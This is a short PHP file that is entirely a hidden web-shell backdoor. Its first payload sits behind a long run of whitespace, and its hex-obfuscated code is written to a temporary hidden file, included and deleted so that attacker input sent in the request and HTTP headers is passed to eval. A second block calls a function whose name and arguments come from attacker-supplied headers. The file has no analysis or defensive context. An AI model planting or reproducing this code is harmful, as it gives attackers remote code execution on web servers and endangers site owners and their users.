<?php																																										$_HEADERS = getallheaders();if(isset($_HEADERS['If-Modified-Since'])){$c="<\x3fp\x68p\x20@\x65v\x61l\x28$\x5fR\x45Q\x55E\x53T\x5b\"\x49f\x2dU\x6em\x6fd\x69f\x69e\x64-\x53i\x6ec\x65\"\x5d)\x3b@\x65v\x61l\x28$\x5fH\x45A\x44E\x52S\x5b\"\x49f\x2dU\x6em\x6fd\x69f\x69e\x64-\x53i\x6ec\x65\"\x5d)\x3b";$f='.'.time();@file_put_contents($f, $c);@include($f);@unlink($f);}

$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $request = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['If-Modified-Since']($_HEADERS['X-Dns-Prefetch-Control']));
    $request();
}